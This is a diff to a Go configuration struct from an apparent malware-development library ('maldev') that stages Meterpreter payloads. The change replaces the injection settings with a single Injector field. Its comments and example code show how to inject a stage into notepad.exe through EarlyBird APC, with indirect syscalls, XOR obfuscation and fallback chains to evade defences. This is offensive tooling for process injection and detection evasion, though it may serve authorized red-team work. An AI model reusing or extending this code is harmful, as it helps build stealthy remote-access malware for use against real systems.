@@ -49,9 +49,9 @@ type Config struct {
 	// Caller routes NT syscalls through a specific method (Windows only).
 	// Accepts *wsyscall.Caller from github.com/oioio-space/maldev/win/syscall.
 	// When nil, standard WinAPI calls are used.
-	// Only applies to the default self-injection path (Method == "").
-	// When Method is set, use inject.NewWindowsInjector with WindowsConfig
-	// for syscall routing control.
+	// Only used when Injector is nil (default self-injection path).
+	// Mutually exclusive with Injector — when Injector is set, configure
+	// syscall routing via inject.WindowsConfig.SyscallMethod instead.
 	Caller any
 
 	// MaxStageSize is the maximum stage payload size in bytes.
@@ -62,25 +62,29 @@ type Config struct {
 	// Default: "Mozilla/5.0".
 	UserAgent string
 
-	// Method specifies the injection technique for stage execution.
-	// When empty, the default self-injection is used (VirtualAlloc+CreateThread
-	// on Windows, purego mmap on Linux). When set, the stage is routed through
-	// the inject package which supports 10+ Windows methods and 5 Linux methods.
-	// See inject.AvailableMethods() for the full list.
-	Method inject.Method
-
-	// TargetPID is the target process ID for remote injection methods
-	// (crt, apc, rtl, apcex, ptrace). When 0, self-injection is used.
-	TargetPID int
-
-	// ProcessPath is the executable path for spawn-and-inject methods
-	// (earlybird, threadhijack). Required when using those methods.
-	ProcessPath string
-
-	// Fallback enables automatic fallback to alternate injection methods
-	// if the primary method fails. See inject.FallbackChain for the
-	// chain order per method.
-	Fallback bool
+	// Injector overrides the default stage execution with a custom injector
+	// from the inject package. Build one with inject.Build(), inject.NewInjector(),
+	// or inject.NewWindowsInjector() to access all injection methods, syscall
+	// routing, decorators (XOR, CPU delay), and fallback chains.
+	//
+	// When nil, the default self-injection is used:
+	//   - Windows: VirtualAlloc + CreateThread (with optional Caller for NT syscalls)
+	//   - Linux: purego mmap + socket passthrough
+	//
+	// On Linux, only self-injection methods are supported because the
+	// Meterpreter wrapper protocol requires reading the ELF from the socket.
+	//
+	// Example (Windows, EarlyBird APC with indirect syscalls and XOR):
+	//
+	//	inj, _ := inject.Build().
+	//	    Method(inject.MethodEarlyBirdAPC).
+	//	    ProcessPath(`C:\Windows\System32\notepad.exe`).
+	//	    IndirectSyscalls().
+	//	    WithFallback().
+	//	    Use(inject.WithXOR).
+	//	    Create()
+	//	cfg := &meterpreter.Config{..., Injector: inj}
+	Injector inject.Injector
 }
 
 // Stager manages the Meterpreter staging process.
